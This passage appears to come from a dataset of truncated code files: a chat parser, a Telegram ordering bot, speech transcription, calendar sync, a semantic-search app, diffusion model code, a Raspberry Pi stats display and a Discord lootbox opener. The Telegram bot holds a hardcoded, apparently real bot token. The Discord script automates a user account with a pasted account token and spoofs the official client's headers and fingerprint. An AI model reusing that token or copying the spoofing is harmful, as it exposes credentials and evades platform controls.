r\"\\d{4}\ub144\\s\\d{1,2}\uc6d4\\s\\d{1,2}\uc77c\\s[\uc6d4\ud654\uc218\ubaa9\uae08\ud1a0\uc77c]\uc694\uc77c|\ub2d8\uc774 (\ub4e4\uc5b4\uc654\uc2b5\ub2c8\ub2e4|\ub098\uac14\uc2b5\ub2c8\ub2e4)\\.\"\n        )\n\n        processed_chat_data = []\n        current_date, current_time, current_user, current_message = None, None, None, \"\"\n\n        for line in chat_lines:\n            if system_message_pattern.search(line):\n                continue\n\n            new_message_match = new_message_pattern.match(line)\n            if new_message_match:\n                if current_user:\n                    current_datetime = self.convert_datetime(\n                        current_date, f\"{new_message_match.group(2)} {current_time}\"\n                    )\n                    processed_chat_data.append(\n                        [\n                            current_datetime,\n                            current_user,\n                            cu",
    "import random\nimport json\nimport pickle\n\nimport numpy as np\nimport telebot\nimport os\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\n\nimport nltk\nfrom nltk.stem import WordNetLemmatizer\n\nfrom tensorflow.keras.models import load_model\n\nlemmatizer = WordNetLemmatizer()\nintents = json.loads(open('training\\intents.json').read())\nmenu = json.loads(open('training\\menu.json').read())\n\nwords = pickle.load(open('training\\words.pkl', 'rb'))\nlabels = pickle.load(open('training\\labels.pkl', 'rb'))\nmodel = load_model('training\\chatbot_model.h5')\n\n\nisOrder = False\ntotal_price = 0.00\n\ndef clean_up_sentence(sentence):\n    sentence_words = nltk.word_tokenize(sentence)\n    sentence_words = [lemmatizer.lemmatize(word) for word in sentence_words]\n    return sentence_words\n\n\ndef bagofwords(sentence):\n    sentence_words = clean_up_sentence(sentence)\n    bag = [0] * len(words)\n    for w in sentence_words:\n        for i, word in enumerate(words):\n            if word == w:\n                bag[i] = 1\n    return np.array(bag)\n\n\n# predict the class based on the sentence\ndef predict_class(sentence):\n    bow = bagofwords(sentence)\n    res = model.predict(np.array([bow]))[0]\n\n    # allows some uncertainty (error detection)\n    ERROR_THRESHOLD = 0.1\n    results = [[i, r] for i, r in enumerate(res) if r > ERROR_THRESHOLD]\n\n    # sort the results\n    results.sort(key=lambda x: x[1], reverse=True)\n    return_list = []\n    for r in results:\n        return_list.append({'intent': labels[r[0]], 'probability': str(r[1])})\n    return return_list\n\n\ndef get_response(intents_list, intents_json):\n    tag = intents_list[0]['intent']\n\n    list_of_intents = intents_json['intents']\n    for i in list_of_intents:\n\n        if i['tag'] == tag:\n            result = random.choice(i['responses'])\n\n            break\n    return result\n\n\ndef order_food(menu_json, id):\n    for x in menu_json:\n\n        if x[\"food_id\"] == id:\n            print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n            print(\"Item name:\", \"\".join(x[\"item_name\"]))\n            print(\"Price:\", \"\".join(x[\"price\"]))\n            return float(x[\"price\"])\n\n\ndef print_stall_menu(menu_json, stall, delivery):\n    for x in menu_json:\n\n        # prints menu for delivery and for the stall\n        if delivery:\n            if x[\"stall_name\"] == stall and x[\"delivery_service\"] == 'yes':\n\n                print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n                print(\"Stall name:\", \"\".join(x[\"stall_name\"]))\n                print(\"Item name:\", \"\".join(x[\"item_name\"]))\n                print(\"Price:\", \"\".join(x[\"price\"]))\n                print(\"Delivery Service:\", \"\".join(x[\"delivery_service\"]))\n                print(\"\\n\")\n\n        # prints menu for stall only\n        else:\n            if x[\"stall_name\"] == stall:\n                print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n                print(\"Stall name:\", \"\".join(x[\"stall_name\"]))\n                print(\"Item name:\", \"\".join(x[\"item_name\"]))\n                print(\"Price:\", \"\".join(x[\"price\"]))\n                print(\"Delivery Service:\", \"\".join(x[\"delivery_service\"]))\n                print(\"\\n\")\n\n\ndef add_order(menu_json, order_id, cart):\n    input_dict = json.loads(menu_json)\n    output_dict = [x for x in input_dict if x['food_id'] == order_id]\n    res = json.dumps(output_dict)\n\n    cart.append(res)\n\n    return cart\n\n\n# API_KEY = os.getenv('API_KEY')\nbot = telebot.TeleBot('6834543597:AAHfo58IPxZq-cY7dvJEc_QUaTU_M1QknfE')\n\n\n@bot.message_handler(commands=['start'])\ndef start(message):\n    bot.send_message(message.chat.id, \"Hi! How can I help you? Would recommend you to start viewing the menu first.\")\n\n# @bot.message_handler(commands=['order'])\n# def start(message):\n#     bot.send_message(message.chat.id, \"Hi! How can I help you? Would recommend you to start viewing the menu first.\")\n#\n#\n#\n#     while temp:\n#         bot.send_message(message.chat.id, 'Type the food id of the food that u want:')\n#         food_id = input()\n#         price = order_food(menu, food_id)\n#         total_price += price  # Total price calculation here\n#\n#         print('Would you like to order anymore food? (1 = no)')\n#         flag = input()\n#\n#         if flag == '1':\n#             temp = False\n#\n#     print('Thanks for your order!')\n#     print('The total price is ')\n#     print(total_price)\n\n\n# shopping_cart_price = 0.00\n\n\n@bot.message_handler(func=lambda m: True)\ndef ordering_process(message):\n    delivery_service = False\n    global isOrder\n    global total_price\n\n    msg = message\n    msg2 = message.text\n\n    if isOrder:\n        food_id = message.text\n        bot.send_message(msg.chat.id, food_id)\n        if food_id.isnumeric():\n\n            price = order_food(menu, food_id)\n\n            total_price += price  # Total price calculation here\n\n            bot.send_message(msg.chat.id, \"Total Price: \" +str(total_price))\n\n        else:\n            bot.send_message(msg.chat.id, \"You did not enter an integer\")\n\n        isOrder=False\n    else:\n        ints = predict_class(msg2)\n        res = get_response",
    "import whisperx\nimport gc\n\ndevice = \"cuda\"\naudio_file = \"audio.mp3\"\nbatch_size = 16 # reduce if low on GPU mem\ncompute_type = \"float16\" # change to \"int8\" if low on GPU mem (may reduce accuracy)\n\n# 1. Transcribe with original whisper (batched)\nmodel = whisperx.load_model(\"large-v2\", device, compute_type=compute_type)\n\n# save model to local path (optional)\n# model_dir = \"/path/\"\n# model = whisperx.load_model(\"large-v2\", device, compute_type=compute_type, download_root=model_dir)\n\naudio = whisperx.load_audio(audio_file)\nresult = model.transcribe(audio, batch_size=batch_size)\nprint(result[\"segments\"]) # before alignment\n\n# delete model if low on GPU resources\n# gc.collect(); torch.cuda.empty_cache(); del model\n\n# 2. Align whisper output\nmodel_a, metadata = whisperx.load_align_model(language_code=result[\"language\"], device=device)\nresult = whisperx.align(result[\"segments\"], model_a, metadata, audio, device, return_char_alignments=False)\n\nprint(result[\"segments\"]) # after alignment\n\n# delete model if low on GPU resources\n# gc.collect(); torch.cuda.empty_cache(); del model_a\n\n# 3. Assign speaker labels\ndiarize_model = whisperx.DiarizationPipeline(use_auth_token=YOUR_HF_TOKEN, device=device)\n\n# add min/max number of speakers if known\ndiarize_segments = diarize_model(audio)\n# diarize_model(audio, min_speakers=min_speakers, max_speakers=max_speakers)\n\nresult = whisperx.assign_word_speakers(diarize_segments, result)\nprint(diarize_segments)\nprint(result[\"segments\"]) # segments are now assigned speaker IDs\n",
    "#\n# The idea of this module is to offer basic\n# reconcilation of todos events in a calendar\n# managed by us.\n# We have two rules:\n# (a) We kill every calendar item that collides with another one, if it's managed by us.\n# (b) We don't repeat ourselves if the calendar item target is the right one by comparing fingerprints.\n# Fingerprint is defined as the hash of the iCalendar object.\nimport caldav\nfrom collections import defaultdict\nfrom .scheduler import ScheduleItem\nfrom datetime import timedelta\n\nclass TodoSynchronizationPlan:\n    def __init__(self, steps: list):\n        self.steps = steps\n        pass\n\n    def apply(self, calendar: caldav.Calendar):\n        for step in self.steps:\n            step.apply(calendar)\n\n    def diagnose(self):\n        for step in self.steps:\n            if isinstance(step, AddStep):\n                print(f'Adding {step}')\n            elif isinstance(step, DeleteStep):\n                print(f'Removing {step}')\n\nclass AddStep:\n    def __init__(self, item: ScheduleItem):\n        self.item = item\n\n    @property\n    def todo_args(self) -> dict:\n        return {\n            'X-TaskWarrior-UUID': self.item.uuid,\n            'dtstart': self.item.planned_time,\n            'duration': timedelta(minutes=self.item.duration_in_minutes),\n            'summary': self.item.job['description']\n        }\n\n    def apply(self, calendar: caldav.Calendar):\n        calendar.save_todo(no_overwrite=True, **self.todo_args)\n\n    def __str__(self):\n        return f'<{self.item.job[\"description\"]} at {self.item.planned_time}>'\n\nclass DeleteStep:\n    def __init__(self, item: ScheduleItem):\n        pass\n\n    def apply(self):\n        print('Applying {self}...')\n\n    def __str__(self):\n        return '...'\n\nclass TodoSynchronizer:\n    def __init__(self, new_schedule: list[ScheduleItem], calendar: caldav.Calendar):\n        self.calendar = calendar\n        self.new_items = new_schedule\n\n    def plan(self) -> TodoSynchronizationPlan:\n        current_items = self.calendar.todos(include_completed=True)\n        taskwarrior_ids = {}\n        steps = []\n        seen = defaultdict(lambda: False)\n\n        for item in current_items:\n            todo_item = item.icalendar_instance.subcomponents[1]\n            taskwarrior_uuid = todo_item.get('X-TaskWarrior-UUID')\n            taskwarrior_ids[taskwarrior_uuid] = item\n            # TODO: handle cancellation\n            if todo_item.get('Status') == 'NEEDS-ACTION':\n                item.delete()\n\n        for item in self.new_items:\n            if item.uuid not in taskwarrior_ids:\n                steps.append(AddStep(item))\n            else:\n                seen[item.uuid] = True\n\n        for uuid, has_been_seen in seen.items():\n            if not has_been_seen:\n                steps.append(DeleteStep(taskwarrior_ids[uuid]))\n\n        return TodoSynchronizationPlan(steps)\n",
    "import streamlit as st\nimport pandas as pd\nimport numpy as np\nfrom sentence_transformers import SentenceTransformer, models\nimport torch\nfrom sentence_transformers.quantization import semantic_search_faiss\nfrom pathlib import Path\nimport time\nimport plotly.express as px\nimport doi\nimport requests\nfrom groq import Groq\n\nAPI_URL = (\n    \"https://api-inference.huggingface.co/models/mixedbread-ai/mxbai-embed-large-v1\"\n)\nsummarization_API_URL = (\n    \"https://api-inference.huggingface.co/models/Falconsai/text_summarization\"\n)\n\nLLM_API_URL = (\n    \"https://api-inference.huggingface.co/models/HuggingFaceH4/zephyr-7b-beta\"\n)\n\nAPI_TOKEN = st.secrets[\"hf_token\"]  # Replace with your Hugging Face API token\n\nheaders = {\"Authorization\": f\"Bearer {API_TOKEN}\"}\n\n\ndef query_hf_api(text, api=API_URL, parameters=None):\n    \n    if not parameters:\n        payload = {\"inputs\": text}\n    else:\n        payload = {\n            \"inputs\": text,\n            \"parameters\": parameters,\n        }\n\n    response = requests.post(api, headers=headers, json=payload)\n\n    try:\n        response_data = response.json()\n    except requests.exceptions.JSONDecodeError:\n        st.error(\"Failed to get a valid response from the server. Please try again later.\")\n        return {}\n\n    # Prepare an empty placeholder that can be filled if needed\n    progress_placeholder = st.empty()\n\n    # Check if the model is currently loading\n    if \"error\" in response_data and \"loading\" in response_data[\"error\"]:\n        estimated_time = response_data.get(\"estimated_time\", 30)  # Default wait time to 30 seconds if not provided\n        with progress_placeholder.container():\n            st.warning(f\"Model from :hugging_face: is currently loading. Estimated wait time: {estimated_time:.1f} seconds. Please wait...\")\n            \n            # Create a progress bar within the container\n            progress_bar = st.progress(0)\n            for i in range(int(estimated_time) + 5):  # Adding a buffer time to ensure the model is loaded\n                # Update progress bar. The factor of 100 is used to convert to percentage completion\n                progress = int((i / (estimated_time + 5)) * 100)\n                progress_bar.progress(progress)\n                time.sleep(1)  # Wait for a second\n\n        # Clear the placeholder once loading is complete\n        progress_placeholder.empty()\n        \n        st.rerun()  # Rerun the app after waiting\n\n    return response_data\n\n\ndef normalize_embeddings(embeddings):\n    \"\"\"\n    Normalizes the embeddings matrix, so that each sentence embedding has unit length.\n\n    Args:\n    embeddings (Tensor): The embeddings tensor to normalize.\n\n    Returns:\n    Tensor: The normalized embeddings.\n    \"\"\"\n    if embeddings.dim() == 1:\n        # Add an extra dimension if the tensor is 1-dimensional\n        embeddings = embeddings.unsqueeze(0)\n    return torch.nn.functional.normalize(embeddings, p=2, dim=1)\n\n\ndef quantize_embeddings(\n    embeddings, precision=\"ubinary\", ranges=None, calibration_embeddings=None\n):\n    \"\"\"\n    Quantizes embeddings to a specified precision using PyTorch and numpy.\n\n    Args:\n    embeddings (Tensor): The embeddings to quantize, assumed to be a Tensor.\n    precision (str): The precision to convert to.\n    ranges (np.ndarray, optional): Ranges for quantization.\n    calibration_embeddings (Tensor, optional): Embeddings used for calibration.\n\n    Returns:\n    Tensor: The quantized embeddings.\n    \"\"\"\n    if precision == \"float32\":\n        return embeddings.float()\n\n    if precision in [\"int8\", \"uint8\"]:\n        if ranges is None:\n            if calibration_embeddings is not None:\n                ranges = torch.stack(\n                    (\n                        torch.min(calibration_embeddings, dim=0)[0],\n                        torch.max(calibration_embeddings, dim=0)[0],\n                    )\n                )\n            else:\n                ranges = torch.stack(\n                    (torch.min(embeddings, dim=0)[0], torch.max(embeddings, dim=0)[0])\n                )\n\n        starts, ends = ranges[0], ranges[1]\n        steps = (ends - starts) / 255\n\n        if precision == \"uint8\":\n            quantized_embeddings = torch.clip(\n                ((embeddings - starts) / steps), 0, 255\n            ).byte()\n        elif precision == \"int8\":\n            quantized_embeddings = torch.clip(\n                ((embeddings - starts) / steps - 128), -128, 127\n            ).char()\n\n    elif precision == \"binary\" or precision == \"ubinary\":\n        embeddings_np = embeddings.numpy() > 0\n        packed_bits = np.packbits(embeddings_np, axis=-1)\n        if precision == \"binary\":\n            quantized_embeddings = torch.from_numpy(packed_bits - 128).char()\n        else:\n            quantized_embeddings = torch.from_numpy(packed_bits).byte()\n\n    else:\n        raise ValueError(f\"Precision {precision} is not supported\")\n\n    return quantized_embeddings\n\n\ndef process_embeddings(embeddings, precision=\"ubinary\", calibration_embeddings=None):\n",
    "from typing import Any, Callable, Dict, List, Optional, Tuple, Union\nimport torch\nfrom diffusers.image_processor import PipelineImageInput\nfrom diffusers.utils import (\n    deprecate,\n    logging,\n    replace_example_docstring,\n)\nfrom diffusers.utils.torch_utils import is_compiled_module, is_torch_version\nfrom diffusers.pipelines.controlnet.multicontrolnet import MultiControlNetModel\nfrom diffusers.models import ControlNetModel\nfrom diffusers.pipelines.stable_diffusion.pipeline_stable_diffusion import rescale_noise_cfg\nfrom diffusers.pipelines.stable_diffusion_xl import StableDiffusionXLPipelineOutput\n\nfrom InstantID.pipeline_stable_diffusion_xl_instantid import StableDiffusionXLInstantIDPipeline\nfrom fouriscale.models import FouriConvProcessor_XL\n\nclass StableDiffusionXLInstantIDFouriScalePipeline(StableDiffusionXLInstantIDPipeline):\n    @torch.no_grad()\n    def __call__(\n        self,\n        prompt: Union[str, List[str]] = None,\n        prompt_2: Optional[Union[str, List[str]]] = None,\n        image: PipelineImageInput = None,\n        height: Optional[int] = None,\n        width: Optional[int] = None,\n        num_inference_steps: int = 50,\n        guidance_scale: float = 5.0,\n        negative_prompt: Optional[Union[str, List[str]]] = None,\n        negative_prompt_2: Optional[Union[str, List[str]]] = None,\n        num_images_per_prompt: Optional[int] = 1,\n        eta: float = 0.0,\n        generator: Optional[Union[torch.Generator, List[torch.Generator]]] = None,\n        latents: Optional[torch.FloatTensor] = None,\n        prompt_embeds: Optional[torch.FloatTensor] = None,\n        negative_prompt_embeds: Optional[torch.FloatTensor] = None,\n        pooled_prompt_embeds: Optional[torch.FloatTensor] = None,\n        negative_pooled_prompt_embeds: Optional[torch.FloatTensor] = None,\n        image_embeds: Optional[torch.FloatTensor] = None,\n        output_type: Optional[str] = \"pil\",\n        return_dict: bool = True,\n        cross_attention_kwargs: Optional[Dict[str, Any]] = None,\n        controlnet_conditioning_scale: Union[float, List[float]] = 1.0,\n        guess_mode: bool = False,\n        control_guidance_start: Union[float, List[float]] = 0.0,\n        control_guidance_end: Union[float, List[float]] = 1.0,\n        original_size: Tuple[int, int] = None,\n        crops_coords_top_left: Tuple[int, int] = (0, 0),\n        target_size: Tuple[int, int] = None,\n        negative_original_size: Optional[Tuple[int, int]] = None,\n        negative_crops_coords_top_left: Tuple[int, int] = (0, 0),\n        negative_target_size: Optional[Tuple[int, int]] = None,\n        clip_skip: Optional[int] = None,\n        callback_on_step_end: Optional[Callable[[int, int, Dict], None]] = None,\n        callback_on_step_end_tensor_inputs: List[str] = [\"latents\"],\n\n        # IP adapter\n        ip_adapter_scale=None,\n\n        # FouriScale\n        denoising_end: Optional[float] = None,\n        dilation: float=1.0,\n        start_step: int=0,\n        stop_step: int=50,\n        layer_settings=None,\n        base_size=None,\n        progressive: bool=False,\n        amp_guidance: bool=False,\n        guidance_rescale: float = 0.0,\n\n        **kwargs,\n    ):\n        callback = kwargs.pop(\"callback\", None)\n        callback_steps = kwargs.pop(\"callback_steps\", None)\n\n        if callback is not None:\n            deprecate(\n                \"callback\",\n                \"1.0.0\",\n                \"Passing `callback` as an input argument to `__call__` is deprecated, consider using `callback_on_step_end`\",\n            )\n        if callback_steps is not None:\n            deprecate(\n                \"callback_steps\",\n                \"1.0.0\",\n                \"Passing `callback_steps` as an input argument to `__call__` is deprecated, consider using `callback_on_step_end`\",\n            )\n\n        controlnet = self.controlnet._orig_mod if is_compiled_module(self.controlnet) else self.controlnet\n\n        height = height or self.unet.config.sample_size * self.vae_scale_factor\n        width = width or self.unet.config.sample_size * self.vae_scale_factor\n\n        original_size = original_size or (height, width)\n        target_size = target_size or (height, width)\n\n        # align format for control guidance\n        if not isinstance(control_guidance_start, list) and isinstance(control_guidance_end, list):\n            control_guidance_start = len(control_guidance_end) * [control_guidance_start]\n        elif not isinstance(control_guidance_end, list) and isinstance(control_guidance_start, list):\n            control_guidance_end = len(control_guidance_start) * [control_guidance_end]\n        elif not isinstance(control_guidance_start, list) and not isinstance(control_guidance_end, list):\n            mult = len(controlnet.nets) if isinstance(controlnet, MultiControlNetModel) else 1\n            control_guidance_start, control_guidance_end = (\n                mult * [control_guidance_start],\n                mult * [control_guidance_end],\n            )\n        \n        # 0. set ip_a",
    "# -*- coding: utf-8 -*-\n#\n# Author: @billz\n# Author URI: https://github.com/billz\n# Description: RaspAP stats display for the Adafruit Mini PiTFT,\n#   a 135x240 Color TFT add-on for the Raspberry Pi.\n#   Based on Adafruit's rgb_display_ministats.py\n# See: https://github.com/adafruit/Adafruit_CircuitPython_RGB_Display\n# License: MIT License\n\nimport time\nimport subprocess\nimport digitalio\nimport board\nfrom PIL import Image, ImageDraw, ImageFont\nimport adafruit_rgb_display.st7789 as st7789\n\n# Configuration for CS and DC pins\ncs_pin = digitalio.DigitalInOut(board.CE0)\ndc_pin = digitalio.DigitalInOut(board.D25)\nreset_pin = None\n\n# Config for display baudrate (default max is 24mhz)\nBAUDRATE = 64000000\n\n# Setup SPI bus using hardware SPI\nspi = board.SPI()\n\n# Create the ST7789 display\ndisp = st7789.ST7789(spi, cs=cs_pin, dc=dc_pin, rst=reset_pin, baudrate=BAUDRATE,\n                     width=240, height=240, x_offset=0, y_offset=80)\n\n# Create blank image with mode 'RGB'\nheight = disp.width   # swap height/width to rotate it to landscape\nwidth = disp.height\nimage = Image.new('RGB', (width, height))\nrotation = 90\n\n# Get a drawing object and clear the image\ndraw = ImageDraw.Draw(image)\ndraw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))\ndisp.image(image,rotation)\n\n# Define some constants\npadding = -2\ntop = padding\nbottom = height-padding\n# Move left to right keeping track of the current x position\nx = 0\ny = 80\n\n# Load DejaVu TTF Font\n# Install with: sudo apt-get install ttf-dejavu\nfont = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 24)\n\n# Turn on the backlight\nbacklight = digitalio.DigitalInOut(board.D22)\nbacklight.switch_to_output()\nbacklight.value = True\n\nwhile True:\n    # Draw a black filled box to clear the image\n    draw.rectangle((0, 0, width, height), outline=0, fill=0)\n\n    # Collect basic system stats\n    cmd = \"hostname -I | cut -d\\' \\' -f1\"\n    IP = \"IP: \"+subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"pidof hostapd | wc -l | awk '{printf \\\"Hotspot: %s\\\", $1 == 1 ? \\\"Active\\\" : \\\"Down\\\"}'\"\n    Hostapd = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"vnstat -i wlan0 | grep tx: | awk '{printf \\\"Data Tx: %d %s\\\", $5,$6}'\"\n    DataTx = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"top -bn1 | grep load | awk '{printf \\\"CPU Load: %.2f\\\", $(NF-2)}'\"\n    CPU = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"free -m | awk 'NR==2{printf \\\"Mem: %sMB %.2f%%\\\", $3,$3*100/$2 }'\"\n    MemUsage = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = 'df -h | awk \\'$NF==\"/\"{printf \"Disk: %d/%d GB  %s\", $3,$2,$5}\\''\n    Disk = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"cat /sys/class/thermal/thermal_zone0/temp |  awk \\'{printf \\\"CPU Temp: %.1f C\\\", $(NF-0) / 1000}\\'\" # pylint: disable=line-too-long\n    Temp = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    # Write five lines of stats\n    y = top\n    draw.text((x, y), IP, font=font, fill=\"#ffffff\")\n    y += font.getsize(IP)[1]\n    draw.text((x, y), Hostapd, font=font, fill=\"#d46a6a\")\n    y += font.getsize(Hostapd)[1]\n    draw.text((x, y), DataTx, font=font, fill=\"#ffffff\")\n    y += font.getsize(DataTx)[1]\n    draw.text((x, y), MemUsage, font=font, fill=\"#d46a6a\")\n    y += font.getsize(MemUsage)[1]\n    draw.text((x, y), Disk, font=font, fill=\"#ffffff\")\n    y += font.getsize(Disk)[1]\n    draw.text((x, y), Temp, font=font, fill=\"#d46a6a\")\n\n    # Display image\n    disp.image(image, rotation)\n    time.sleep(.1)\n",
    "# Adapted from https://github.com/huggingface/diffusers/blob/main/src/diffusers/models/transformer_2d.py\nfrom dataclasses import dataclass\nfrom typing import Any, Dict, Optional\n\nimport torch\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\nfrom diffusers.models.embeddings import PixArtAlphaTextProjection\nfrom diffusers.models.lora import LoRACompatibleConv, LoRACompatibleLinear\nfrom diffusers.models.modeling_utils import ModelMixin\nfrom diffusers.models.normalization import AdaLayerNormSingle\nfrom diffusers.utils import USE_PEFT_BACKEND, BaseOutput, deprecate, is_torch_version\nfrom torch import nn\n\nfrom .attention import BasicTransformerBlock\n\n\n@dataclass\nclass Transformer2DModelOutput(BaseOutput):\n    \"\"\"\n    The output of [`Transformer2DModel`].\n\n    Args:\n        sample (`torch.FloatTensor` of shape `(batch_size, num_channels, height, width)` or `(batch size, num_vector_embeds - 1, num_latent_pixels)` if [`Transformer2DModel`] is discrete):\n            The hidden states output conditioned on the `encoder_hidden_states` input. If discrete, returns probability\n            distributions for the unnoised latent pixels.\n    \"\"\"\n\n    sample: torch.FloatTensor\n    ref_feature: torch.FloatTensor\n\n\nclass Transformer2DModel(ModelMixin, ConfigMixin):\n    \"\"\"\n    A 2D Transformer model for image-like data.\n\n    Parameters:\n        num_attention_heads (`int`, *optional*, defaults to 16): The number of heads to use for multi-head attention.\n        attention_head_dim (`int`, *optional*, defaults to 88): The number of channels in each head.\n        in_channels (`int`, *optional*):\n            The number of channels in the input and output (specify if the input is **continuous**).\n        num_layers (`int`, *optional*, defaults to 1): The number of layers of Transformer blocks to use.\n        dropout (`float`, *optional*, defaults to 0.0): The dropout probability to use.\n        cross_attention_dim (`int`, *optional*): The number of `encoder_hidden_states` dimensions to use.\n        sample_size (`int`, *optional*): The width of the latent images (specify if the input is **discrete**).\n            This is fixed during training since it is used to learn a number of position embeddings.\n        num_vector_embeds (`int`, *optional*):\n            The number of classes of the vector embeddings of the latent pixels (specify if the input is **discrete**).\n            Includes the class for the masked latent pixel.\n        activation_fn (`str`, *optional*, defaults to `\"geglu\"`): Activation function to use in feed-forward.\n        num_embeds_ada_norm ( `int`, *optional*):\n            The number of diffusion steps used during training. Pass if at least one of the norm_layers is\n            `AdaLayerNorm`. This is fixed during training since it is used to learn a number of embeddings that are\n            added to the hidden states.\n\n            During inference, you can denoise for up to but not more steps than `num_embeds_ada_norm`.\n        attention_bias (`bool`, *optional*):\n            Configure if the `TransformerBlocks` attention should contain a bias parameter.\n    \"\"\"\n\n    _supports_gradient_checkpointing = True\n\n    @register_to_config\n    def __init__(\n        self,\n        num_attention_heads: int = 16,\n        attention_head_dim: int = 88,\n        in_channels: Optional[int] = None,\n        out_channels: Optional[int] = None,\n        num_layers: int = 1,\n        dropout: float = 0.0,\n        norm_num_groups: int = 32,\n        cross_attention_dim: Optional[int] = None,\n        attention_bias: bool = False,\n        sample_size: Optional[int] = None,\n        num_vector_embeds: Optional[int] = None,\n        patch_size: Optional[int] = None,\n        activation_fn: str = \"geglu\",\n        num_embeds_ada_norm: Optional[int] = None,\n        use_linear_projection: bool = False,\n        only_cross_attention: bool = False,\n        double_self_attention: bool = False,\n        upcast_attention: bool = False,\n        norm_type: str = \"layer_norm\",\n        norm_elementwise_affine: bool = True,\n        norm_eps: float = 1e-5,\n        attention_type: str = \"default\",\n        caption_channels: int = None,\n    ):\n        super().__init__()\n        self.use_linear_projection = use_linear_projection\n        self.num_attention_heads = num_attention_heads\n        self.attention_head_dim = attention_head_dim\n        inner_dim = num_attention_heads * attention_head_dim\n\n        conv_cls = nn.Conv2d if USE_PEFT_BACKEND else LoRACompatibleConv\n        linear_cls = nn.Linear if USE_PEFT_BACKEND else LoRACompatibleLinear\n\n        # 1. Transformer2DModel can process both standard continuous images of shape `(batch_size, num_channels, width, height)` as well as quantized image embeddings of shape `(batch_size, num_image_vectors)`\n        # Define whether input is continuous or discrete depending on configuration\n        self.is_input_continuous = (in_channels is not None) and (patch_size is None)\n        self.is_input_vectori",
    "import tls_client\nimport time\nimport datetime\nimport os, random\n\nred = '\\x1b[31m(-)\\x1b[0m'\nblue = '\\x1b[34m(+)\\x1b[0m'\ngreen = '\\x1b[32m(+)\\x1b[0m'\nyellow = '\\x1b[33m(!)\\x1b[0m'\n\ndef get_timestamp():\n    time_idk = datetime.datetime.now().strftime('%H:%M:%S')\n    timestamp = f'[\\x1b[90m{time_idk}\\x1b[0m]'\n    return timestamp\n\nclass DiscordSession:\n    def __init__(self, client_identifier=\"chrome112\"):\n        self.session = tls_client.Session(client_identifier=client_identifier, random_tls_extension_order=True)\n\n    def post(self, url, headers):\n        return self.session.post(url, headers=headers)\n\nclass LootBoxOpener:\n    lootbox_items = {\n        \"1214340999644446726\": \"Quack!!\",\n        \"1214340999644446724\": \"\u2b95\u2b06\u2b07\u2b95\u2b06\u2b07\",\n        \"1214340999644446722\": \"Wump Shell\",\n        \"1214340999644446720\": \"Buster Blade\",\n        \"1214340999644446725\": \"Power Helmet\",\n        \"1214340999644446723\": \"Speed Boost\",\n        \"1214340999644446721\": \"Cute Plushie\",\n        \"1214340999644446728\": \"Dream Hammer\",\n        \"1214340999644446727\": \"OHHHHH BANANA\"\n    }\n\n    def __init__(self, discord_session, token):\n        self.discord_session = discord_session\n        self.token = token\n        self.headers = {\n            'authority': 'discord.com',\n            'accept': '*/*',\n            'accept-language': 'en-US',\n            'authorization': token,\n            'origin': 'https://discord.com',\n            'referer': 'https://discord.com/channels/1222747973205758002/1224417703100551169',\n            'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"',\n            'sec-ch-ua-mobile': '?0',\n            'sec-ch-ua-platform': '\"Windows\"',\n            'sec-fetch-dest': 'empty',\n            'sec-fetch-mode': 'cors',\n            'sec-fetch-site': 'same-origin',\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9037 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36',\n            'x-debug-options': 'bugReporterEnabled',\n            'x-discord-locale': 'en-US',\n            'x-discord-timezone': 'Asia/Calcutta',\n            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDM3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MzEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMzcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyODA3MDAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjQ1MzY5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',\n        }\n\n    def open_lootbox(self):\n        response = self.discord_session.post('https://discord.com/api/v9/users/@me/lootboxes/open', headers=self.headers)\n        if 'rate limited' in response.text:\n            print(f\"{get_timestamp()} {yellow} You Are Being Rate Limited!\")\n            time.sleep(2)\n        elif response.status_code == 200:\n            opened_item = response.json().get('opened_item')\n            if opened_item in self.lootbox_items:\n                print(f\"{get_timestamp()} {green} Successfully Opened A Lootbox : {self.lootbox_items[opened_item]}\")\n                time.sleep(random.uniform(7, 10))\n            else:\n                print(f\"{get_timestamp()} {red} An Unknown Item Was Received.\")\n        else:\n            print(f'{get_timestamp()} {red} An Error Occurred : {response.status_code} - {response.text}')\n\ndef main():\n    token = input(f\"{get_timestamp()} {blue} Please Enter Your Account Token : \")\n    discord_session = DiscordSession()\n    lootbox_opener = LootBoxOpener(discord_session, token)\n    \n    while True:\n        